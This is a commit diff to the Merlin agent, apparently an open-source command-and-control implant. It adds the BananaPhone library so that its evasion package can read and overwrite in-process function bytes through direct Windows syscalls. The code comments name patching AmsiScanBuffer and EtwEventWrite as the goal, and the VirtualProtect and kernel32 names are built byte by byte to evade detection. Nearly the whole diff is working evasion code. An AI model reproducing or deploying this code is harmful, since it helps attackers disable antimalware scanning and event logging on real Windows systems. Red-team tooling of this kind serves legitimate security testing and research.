dbbf30e618a55594994443c8355685d5010d4d11
Ne0nd0g <Russel.VanTuyl@gmail.com>
2022-04-02 08:10:03 -0400

    MOAR BANANA and new memory command

--- go.mod
+++ go.mod
@@ -3,8 +3,9 @@ module github.com/Ne0nd0g/merlin-agent
 go 1.16
 
 require (
+	github.com/C-Sto/BananaPhone v0.0.0-20220220002628-6585e5913761 // indirect
 	github.com/CUCyber/ja3transport v0.0.0-20201031204932-8a22ac8ab5d7 // indirect
-	github.com/Ne0nd0g/go-clr v1.0.1
+	github.com/Ne0nd0g/go-clr v1.0.2
 	github.com/Ne0nd0g/ja3transport v0.0.0-20200203013218-e81e31892d84
 	github.com/Ne0nd0g/merlin v1.3.0
 	github.com/cretz/gopaque v0.1.0
@@ -14,6 +15,7 @@ require (
 	github.com/satori/go.uuid v1.2.0
 	golang.org/x/crypto v0.0.0-20211209193657-4570a0811e8b
 	golang.org/x/net v0.0.0-20211209124913-491a49abca63
-	golang.org/x/sys v0.0.0-20211015200801-69063c4bb744
+	golang.org/x/sys v0.0.0-20220330033206-e17cdc41300f
+	golang.org/x/text v0.3.7 // indirect
 	gopkg.in/square/go-jose.v2 v2.3.1
 )
--- os/windows/pkg/evasion/evasion.go
+++ os/windows/pkg/evasion/evasion.go
@@ -26,6 +26,9 @@ import (
 	"syscall"
 	"unsafe"
 
+	// 3rd Party
+	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
+
 	// X-Packages
 	"golang.org/x/sys/windows"
 )
@@ -33,46 +36,82 @@ import (
 // Patch will find the target procedure and overwrite the start of its function with the provided bytes.
 // Used to for evasion to patch things like amsi.dll!AmsiScanBuffer or ntdll.dll!EtwEvenWrite
 func Patch(module string, proc string, data *[]byte) (string, error) {
-	oldBytes, err := read(module, proc, len(*data))
+	oldBytes, err := ReadBanana(module, proc, len(*data))
 	if err != nil {
 		return "", err
 	}
 
-	out := fmt.Sprintf("Read %d bytes from %s!%s: %X", len(*data), module, proc, oldBytes)
+	out := fmt.Sprintf("\nRead  %d bytes from %s!%s: %X", len(*data), module, proc, oldBytes)
 
-	err = write(module, proc, data)
+	err = WriteBanana(module, proc, data)
 	if err != nil {
 		return out, err
 	}
 
-	oldBytes, err = read(module, proc, len(*data))
+	out += fmt.Sprintf("\nWrote %d bytes to   %s!%s: %X", len(*data), module, proc, *data)
+
+	oldBytes, err = ReadBanana(module, proc, len(*data))
 	if err != nil {
 		return out, err
 	}
 
-	out += fmt.Sprintf("\nWrote %d bytes to %s!%s: %X", len(*data), module, proc, *data)
+	out += fmt.Sprintf("\nRead  %d bytes from %s!%s: %X", len(*data), module, proc, oldBytes)
 
 	return out, nil
 }
 
-// read will find the target module and procedure address and then read its byteLength
-func read(module string, proc string, byteLength int) ([]byte, error) {
+// Read will find the target module and procedure address and then read its byteLength
+func Read(module string, proc string, byteLength int) ([]byte, error) {
 	target := syscall.NewLazyDLL(module).NewProc(proc)
+	err := target.Find()
+	if err != nil {
+		return nil, err
+	}
 
 	data := make([]byte, byteLength)
 	var readBytes *uintptr
 
-	err := windows.ReadProcessMemory(windows.CurrentProcess(), target.Addr(), &data[0], uintptr(byteLength), readBytes)
+	err = windows.ReadProcessMemory(windows.CurrentProcess(), target.Addr(), &data[0], uintptr(byteLength), readBytes)
 	if err != nil {
 		return data, err
 	}
 	return data, nil
 }
 
-// write will find the target module and procedure and overwrite the start of the function with the provided bytes
-func write(module string, proc string, data *[]byte) error {
-	virtualProtect := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'})).NewProc(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't'}))
+// ReadBanana will find the target procedure and overwrite the start of its function with the provided bytes directly
+// using the NtReadVirtualMemory syscall
+func ReadBanana(module string, proc string, byteLength int) ([]byte, error) {
 	target := syscall.NewLazyDLL(module).NewProc(proc)
+	err := target.Find()
+	if err != nil {
+		return nil, err
+	}
+	data := make([]byte, byteLength)
+	banana, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
+	if err != nil {
+		return data, err
+	}
+	NtReadVirtualMemory, err := banana.GetSysID("NtReadVirtualMemory")
+	if err != nil {
+		return data, err
+	}
+
+	ret, err := bananaphone.Syscall(NtReadVirtualMemory, uintptr(0xffffffffffffffff), target.Addr(), uintptr(unsafe.Pointer(&data[0])), uintptr(byteLength), 0)
+	if ret != 0 || err != nil {
+		return data, fmt.Errorf("there was an error making the NtReadVirtualMemory syscall with a return of %d: %s", 0, err)
+	}
+	//fmt.Printf("Read  %v bytes from %s!%s: %X\n", byteLength, module, proc, data)
+	return data, nil
+}
+
+// Write will find the target module and procedure and overwrite the start of the function with the provided bytes
+func Write(module string, proc string, data *[]byte) error {
+	target := syscall.NewLazyDLL(module).NewProc(proc)
+	err := target.Find()
+	if err != nil {
+		return err
+	}
+	virtualProtect := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'})).NewProc(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't'}))
 
 	var oldProtect uint32
 
@@ -92,5 +131,50 @@ func write(module string, proc string, data *[]byte) error {
 	if ret == 0 || err != syscall.Errno(0) {
 		return fmt.Errorf("there was an error calling Kernel32!VirtualProtect with return code %d: %s\n", ret, err)
 	}
+	return nil
+}
+
+// WriteBanana will find the target module and procedure and overwrite the start of the function with the provided bytes
+// using the ZwWriteVirtualMemory syscall directly
+func WriteBanana(module string, proc string, data *[]byte) error {
+	target := syscall.NewLazyDLL(module).NewProc(proc)
+	err := target.Find()
+	if err != nil {
+		return err
+	}
+	banana, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
+	if err != nil {
+		return err
+	}
+	ZwWriteVirtualMemory, err := banana.GetSysID("ZwWriteVirtualMemory")
+	if err != nil {
+		return err
+	}
+	NtProtectVirtualMemory, err := banana.GetSysID("NtProtectVirtualMemory")
+	if err != nil {
+		return err
+	}
+
+	baseAddress := target.Addr()
+	numberOfBytesToProtect := uintptr(len(*data))
+	var oldProtect uint32
+
+	// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html
+	ret, err := bananaphone.Syscall(NtProtectVirtualMemory, uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&baseAddress)), uintptr(unsafe.Pointer(&numberOfBytesToProtect)), syscall.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
+	if ret != 0 || err != nil {
+		return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
+	}
+
+	// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html
+	ret, err = bananaphone.Syscall(ZwWriteVirtualMemory, uintptr(0xffffffffffffffff), target.Addr(), uintptr(unsafe.Pointer(&[]byte(*data)[0])), unsafe.Sizeof(*data), 0)
+	if ret != 0 || err != nil {
+		return fmt.Errorf("there was an error making the ZwWriteVirtualMemory syscall with a return of %d: %s", 0, err)
+	}
+
+	ret, err = bananaphone.Syscall(NtProtectVirtualMemory, uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&baseAddress)), uintptr(unsafe.Pointer(&numberOfBytesToProtect)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
+	if ret != 0 || err != nil {
+		return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
+	}
+	//fmt.Printf("Wrote %d bytes from %s!%s: %X\n", len(*data), module, proc, *data)
 	return nil
 }
